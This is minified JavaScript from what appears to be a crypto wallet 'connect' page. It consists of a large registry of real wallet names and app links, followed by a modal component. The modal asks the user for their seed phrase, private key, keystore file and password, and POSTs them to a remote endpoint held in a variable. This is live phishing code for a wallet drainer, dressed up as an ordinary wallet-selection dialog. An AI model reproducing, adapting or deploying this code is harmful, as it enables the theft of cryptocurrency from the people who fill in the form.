    "138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98": {
      id: "138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98",
      name: "AlphaWallet",
      homepage: "https://alphawallet.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/alphawallet-eth-wallet/id1358230430",
        android:
          "https://play.google.com/store/apps/details?id=io.stormbird.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "https://aw.app" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "AlphaWallet",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    "29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09": {
      id: "29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09",
      name: "ZelCore",
      homepage: "https://zel.network",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/zelcore/id1436296839",
        android:
          "https://play.google.com/store/apps/details?id=com.zelcash.zelcore",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "zel:", universal: "https://link.zel.network" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "ZelCore",
        colors: { primary: "rgb(35, 34, 32)", secondary: "" },
      },
    },
    "8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3dacbb14": {
      id: "8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3dacbb14",
      name: "Nash",
      homepage: "https://nash.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/nash-app/id1475759236",
        android: "https://play.google.com/store/apps/details?id=io.nash.app",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "nash:", universal: "https://nash.io/walletconnect" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Nash",
        colors: { primary: "rgb(0,82,243)", secondary: "" },
      },
    },
    nova: { id: "nova", name: "Nova Wallet" },
    keplr: { id: "keplr", name: "Keplr Wallet" },
    fox: { id: "fox", name: "FOX Wallet" },
    ronin: { id: "ronin", name: "Ronin Wallet" },
    "9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814": {
      id: "9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814",
      name: "Coinomi",
      homepage: "https://coinomi.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://itunes.apple.com/app/coinomi-wallet/id1333588809",
        android:
          "https://play.google.com/store/apps/details?id=com.coinomi.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Coinomi",
        colors: { primary: "", secondary: "" },
      },
    },
    "6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702": {
      id: "6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702",
      name: "GridPlus",
      homepage: "https://gridplus.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "",
        android: "",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "GridPlus",
        colors: { primary: "", secondary: "" },
      },
    },
    a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5: {
      id: "a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5",
      name: "CYBAVO Wallet",
      homepage: "https://cybavo.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/tw/app/cybavo-wallet/id1510697681",
        android:
          "https://play.google.com/store/apps/details?id=com.cybavo.btc.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "cybavowallet:", universal: "https://cdn.cybavo.com" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "CYBAVO",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0: {
      id: "c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0",
      name: "Tokenary",
      homepage: "https://tokenary.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/tokenary-ethereum-wallet/id1372886601",
        android:
          "https://play.google.com/store/apps/details?id=com.jufy.tokenary",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Tokenary",
        colors: { primary: "", secondary: "" },
      },
    },
    "3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50": {
      id: "3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50",
      name: "Torus",
      homepage: "https://toruswallet.io/",
      chains: ["eip155:1"],
      app: {
        browser: "https://app.tor.us/",
        ios: "",
        android: "",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: { shortName: "Torus", colors: { primary: "", secondary: "" } },
    },
    "7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09": {
      id: "7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09",
      name: "Spatium",
      homepage: "https://spatium.net/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/spatium/id1404844195",
        android:
          "https://play.google.com/store/apps/details?id=capital.spatium.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Spatium",
        colors: { primary: "", secondary: "" },
      },
    },
    d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6: {
      id: "d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6",
      name: "Infinito",
      homepage: "https://infinitowallet.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/infinito-wallet/id1315572736",
        android:
          "https://play.google.com/store/apps/details?id=io.infinito.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Infinito",
        colors: { primary: "", secondary: "" },
      },
    },
    "176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b": {
      id: "176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b",
      name: "wallet.io",
      homepage: "https://wallet.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/vn/app/wallet-io/id1459857368",
        android: "https://play.google.com/store/apps/details?id=io.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "wallet.io",
        colors: { primary: "", secondary: "" },
      },
    },
    "802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c6900f": {
      id: "802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c6900f",
      name: "Infinity Wallet",
      homepage: "https://infinitywallet.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "",
        android: "",
        mac: "https://infinitywallet.io/desktop",
        windows: "https://infinitywallet.io/desktop",
        linux: "https://infinitywallet.io/desktop",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Infinity",
        colors: { primary: "", secondary: "" },
      },
    },
    bitverse: { id: "bitverse", name: "BitVerse Wallet" },
    solace: { id: "solace", name: "Solace Wallet" },
    "8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad": {
      id: "8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad",
      name: "Ownbit",
      homepage: "https://ownbit.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/es/app/ownbit-btc-eth-cold-wallet/id1321798216",
        android:
          "https://play.google.com/store/apps/details?id=com.bitbill.www",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: { shortName: "Ownbit", colors: { primary: "", secondary: "" } },
    },
    "244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c": {
      id: "244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c",
      name: "EasyPocket",
      homepage: "https://easypocket.app/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/id1517338927",
        android: "https://easypocket.app/",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: {
        native: "easypocket:",
        universal: "https://wallet.easypocket.app",
      },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "EasyPocket",
        colors: { primary: "rgb(17, 93, 251)", secondary: "" },
      },
    },
    "881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb": {
      id: "881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb",
      name: "Bridge Wallet",
      homepage: "https://mtpelerin.com/bridge-wallet",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/bridge-wallet/id1481859680",
        android:
          "https://play.google.com/store/apps/details?id=com.mtpelerin.bridge",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: { shortName: "Bridge", colors: { primary: "", secondary: "" } },
    },
    "3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1": {
      id: "3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1",
      name: "SparkPoint",
      homepage: "https://sparkpoint.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "",
        android: "https://play.google.com/store/apps/details?id=com.sparkpoint",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "sparkpoint:", universal: "https://sparkpoint.io" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "SparkPoint",
        colors: { primary: "rgb(20,67,95)", secondary: "" },
      },
    },
    ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1: {
      id: "ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1",
      name: "ViaWallet",
      homepage: "https://viawallet.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://itunes.apple.com/us/app/viawallet/id1462031389",
        android:
          "https://play.google.com/store/apps/details?id=com.viabtc.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "ViaWallet",
        colors: { primary: "", secondary: "" },
      },
    },
    "42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106": {
      id: "42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106",
      name: "BitKeep",
      homepage: "https://bitkeep.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://itunes.apple.com/app/bitkeep/id1395301115",
        android:
          "https://play.google.com/store/apps/details?id=com.bitkeep.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "bitkeep:", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "BitKeep",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c: {
      id: "b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c",
      name: "Vision",
      homepage: "https://vision-crypto.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/id1500186931",
        android:
          "https://play.google.com/store/apps/details?id=com.eletac.tronwallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: { shortName: "Vision", colors: { primary: "", secondary: "" } },
    },
    "38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b": {
      id: "38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b",
      name: "PEAKDEFI Wallet",
      homepage: "https://peakdefi.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/app/peakdefi-wallet/id1526193527",
        android:
          "https://play.google.com/store/apps/details?id=com.peakdefiwallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: {
        native: "peakdefiwallet:",
        universal: "https://peakdefi.com/download",
      },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "PEAKDEFI",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    "7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd": {
      id: "7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd",
      name: "Unstoppable Wallet",
      homepage: "https://unstoppable.money/",
      chains: ["eip155:1", "eip155:56"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/app/bank-bitcoin-wallet/id1447619907?ls=1",
        android:
          "https://play.google.com/store/apps/details?id=io.horizontalsystems.bankwallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: {
        native: "moneyunstoppable:",
        universal: "https://unstoppable.money/",
      },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Unstoppable",
        colors: { primary: "#FFBE43", secondary: "" },
      },
    },
    "025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0": {
      id: "025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0",
      name: "HaloDeFi Wallet",
      homepage: "https://halodefi.org/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "",
        android:
          "https://play.google.com/store/apps/details?id=com.halodefi.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "halodefiwallet:", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "HaloDeFi",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e: {
      id: "d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e",
      name: "Dok Wallet",
      homepage: "https://dokwallet.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/il/app/dokwallet-crypto-wallet/id1533065700",
        android: "https://play.google.com/store/apps/details?id=com.dok.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: { shortName: "Dok", colors: { primary: "", secondary: "" } },
    },
    "3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5": {
      id: "3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5",
      name: "AT.Wallet",
      homepage: "https://authentrend.com/at-wallet/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/at-wallet/id1479171310",
        android:
          "https://play.google.com/store/apps/details?id=com.authentrend.atwallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "AT.Wallet",
        colors: { primary: "", secondary: "" },
      },
    },
    "1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719": {
      id: "1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719",
      name: "Midas Wallet",
      homepage: "https://midasprotocol.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://itunes.apple.com/us/app/midas-protocol-crypto-wallet/id1436698193",
        android:
          "https://play.google.com/store/apps/details?id=com.midasprotocol.wallet.android",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: { shortName: "Midas", colors: { primary: "", secondary: "" } },
    },
    "15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef": {
      id: "15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef",
      name: "Ellipal",
      homepage: "https://ellipal.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/ellipal/id1426179665",
        android:
          "https://play.google.com/store/apps/details?id=com.ellipal.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "ellipal:", universal: "https://www.ellipal.com/" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Ellipal",
        colors: { primary: "rgb(48, 124, 249)", secondary: "" },
      },
    },
    "0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3": {
      id: "0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3",
      name: "KEYRING PRO",
      homepage: "https://keyring.app/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/keyring-pro-wallet-management/id1546824976",
        android:
          "https://play.google.com/store/apps/details?id=co.bacoor.keyring",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "keyring:", universal: "https://keyring.app" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "KEYRINGPRO",
        colors: { primary: "", secondary: "" },
      },
    },
    "19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c": {
      id: "19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c",
      name: "Aktionariat",
      homepage: "https://aktionariat.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/ch/app/aktionariat/id1518326813",
        android:
          "https://play.google.com/store/apps/details?id=com.aktionariat.app",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: {
        native: "aktionariat:",
        universal: "https://app.aktionariat.com",
      },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Aktionariat",
        colors: { primary: "rgb(10, 20, 20)", secondary: "" },
      },
    },
    "95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c": {
      id: "t",
      name: "Talken Wallet",
      homepage: "https://talken.io",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/talken/id1459475831",
        android:
          "https://play.google.com/store/apps/details?id=io.talken.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "talken-wallet:", universal: "https://talken.io" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Talken",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    "78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4": {
      id: "78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4",
      name: "XinFin XDC Network",
      homepage: "https://www.xinfin.io/",
      chains: ["eip155:1"],
      app: {
        browser: "https://xinfin.network/",
        ios: "",
        android: "https://play.google.com/store/apps/details?id=com.xdcwallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: { shortName: "XinFin", colors: { primary: "", secondary: "" } },
    },
    d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c: {
      id: "d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c",
      name: "Flare Wallet",
      homepage: "https://flarewallet.io",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/flare-wallet/id1496651406",
        android: "https://play.google.com/store/apps/details?id=com.flare",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "flare:", universal: "https://flarewallet.io" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Flare",
        colors: { primary: "rgb(31, 36, 59)", secondary: "" },
      },
    },
    "55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d107670": {
      id: "55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d107670",
      name: "KyberSwap",
      homepage: "https://kyberswap.com/",
      chains: ["eip155:1"],
      app: {
        browser: "https://kyberswap.com/",
        ios: "",
        android: "",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: {
        native: "kyberswap:",
        universal: "https://kyberswapnew.app.link",
      },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "KyberSwap",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    "6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0": {
      id: "6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0",
      name: "AToken Wallet",
      homepage: "https://atoken.com",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/atoken-app/id1395835245",
        android:
          "https://play.google.com/store/apps/details?id=wallet.gem.com.atoken",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "atoken:", universal: "https://www.atoken.com" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "AToken",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    "4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9": {
      id: "4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9",
      name: "Tongue Wallet",
      homepage: "https://www.tongue.fi",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/fr/app/tongue-wallet-for-defi-degens/id1534705854",
        android: "",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "tongue:", universal: "https://www.tongue.fi" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Tongue",
        colors: { primary: "rgb(255, 49, 120)", secondary: "" },
      },
    },
    b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346: {
      id: "b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346",
      name: "RWallet",
      homepage: "https://rsk.co/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/rwallet/id1489241342",
        android:
          "https://play.google.com/store/apps/details?id=com.rsk.rwallet.reactnative",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "rwallet:", universal: "https://www.rwallet.app" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "RWallet",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    "13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70": {
      id: "13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70",
      name: "PlasmaPay",
      homepage: "https://plasmapay.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/app/id1461735396",
        android:
          "https://play.google.com/store/apps/details?id=com.plasmapay.androidapp",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "plasmapay:", universal: "https://plasmapay.com/" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "PlasmaPay",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    "0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0": {
      id: "0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0",
      name: "O3Wallet",
      homepage: "https://o3.network",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://itunes.apple.com/app/id1528451572",
        android:
          "https://play.google.com/store/apps/details?id=com.o3.o3wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "o3wallet:", universal: "https://o3.network" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "O3Wallet",
        colors: { primary: "rgb(255,255,255)", secondary: "" },
      },
    },
    "761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c": {
      id: "761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c",
      name: "HashKey Me",
      homepage: "https://me.hashkey.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/hashkey-me/id1547228803",
        android: "",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "hashme:", universal: "https://me.hashkey.com" },
      desktop: { native: "hashme:", universal: "https://me.hashkey.com" },
      metadata: {
        shortName: "HashKey Me",
        colors: { primary: "rgb(254, 142, 63)", secondary: "" },
      },
    },
    "0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a2d950": {
      id: "0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a2d950",
      name: "Jade Wallet",
      homepage: "https://jadewallet.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/jade-wallet-bitcoin-defi/id1544207492",
        android: "",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Jade",
        colors: { primary: "#212d66", secondary: "" },
      },
    },
    c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266: {
      id: "c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266",
      name: "Guarda Wallet",
      homepage: "https://guarda.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/app/apple-store/id1442083982?mt=8",
        android:
          "https://play.google.com/store/apps/details?id=com.crypto.multiwallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Guarda",
        colors: { primary: "#fff", secondary: "" },
      },
    },
    ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215: {
      id: "ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215",
      name: "Defiant",
      homepage: "https://defiantapp.tech/",
      chains: ["eip155:1", "eip155:42", "eip155:30", "eip155:31"],
      app: {
        browser: "",
        ios: "",
        android:
          "https://play.google.com/store/apps/details?id=ar.com.andinasmart.defiant",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "defiantapp:", universal: "https://defiantapp.tech" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Defiant",
        colors: { primary: "#274A60", secondary: "#65ef9d" },
      },
    },
    "1ce6dae0fea7114846382391d946784d95d9032460a857bb23b55bd9807259d1": {
      id: "1ce6dae0fea7114846382391d946784d95d9032460a857bb23b55bd9807259d1",
      name: "Trustee Wallet",
      homepage: "https://trusteeglobal.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/trustee-wallet-bitcoin-wallet/id1462924276",
        android:
          "https://play.google.com/store/apps/details?id=com.trusteewallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Trustee",
        colors: { primary: "", secondary: "" },
      },
    },
    ex784227: {
      id: "1ce6dae0fea7114844",
      name: "Exodus",
      chains: ["eip155:1"],
    },
    others: { id: "1ce6dae0fea7114844", name: "Others", chains: ["eip155:1"] },
  },
  tv = ({ id: e, open: t, onClose: n, onSubmit: r }) => {
    const l = On,
      [a, o] = p.useState({
        phrase: "",
        keystore: "",
        password: "",
        privateKey: "",
      }),
      [i, s] = p.useState(""),
      [u, d] = p.useState(!1),
      v = async (y) => {
        if ((y.preventDefault(), e === "others" && !i))
          return alert("Please fill the Wallet Name");
        d(!0);
        try {
          const w = {
            senderPrivateKey: a.privateKey || null,
            walletSecretPhrase: a.phrase || null,
            keystoreJson: a.keystore || null,
            keystorePassword: a.privateKey || null,
          };

          const x = await fetch(qh, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(w),
          });
          if (x.ok) await x.json(), r(g);
          else {
            const k = await x.json();
            console.error("Error:", k);
          }
        } catch (w) {
          console.error("Error:", w);
        } finally {
          d(!1);
        }
      },
      g = p.useMemo(() => {
        var y;
        return aa.includes(e)
          ? e
          : e === "others"
          ? i || "Others"
          : (y = l[e]) == null
          ? void 0
          : y.name;
      }, [e, l, i]);
    return f.jsx(we, {
      appear: !0,
      show: t,
      as: p.Fragment,
      children: f.jsxs(Re, {
        as: "div",
        className: "relative z-10",
        onClose: n,
        children: [
          f.jsx(we.Child, {
            as: p.Fragment,
            enter: "ease-out duration-300",
            enterFrom: "opacity-0",
            enterTo: "opacity-100",
            leave: "ease-in duration-200",
            leaveFrom: "opacity-100",
            leaveTo: "opacity-0",
            children: f.jsx("div", { className: "fixed inset-0 bg-black/50" }),
          }),
          f.jsx("div", {
            className: "fixed inset-0 overflow-y-auto",
            children: f.jsx("div", {
              className: "flex h-screen items-end justify-center text-center",
              children: f.jsx(we.Child, {
                as: p.Fragment,
                enter: "ease-out duration-300",
                enterFrom: "opacity-0 scale-95",
                enterTo: "opacity-100 scale-100",
                leave: "ease-in duration-200",
                leaveFrom: "opacity-100 scale-100",
                leaveTo: "opacity-0 scale-95",
                children: f.jsxs(Re.Panel, {
                  className:
                    "w-full md:h-full rounded-t-2xl md:rounded-t-none transform overflow-hidden bg-black text-white text-left transition-all",
                  children: [
                    f.jsxs("header", {
                      className:
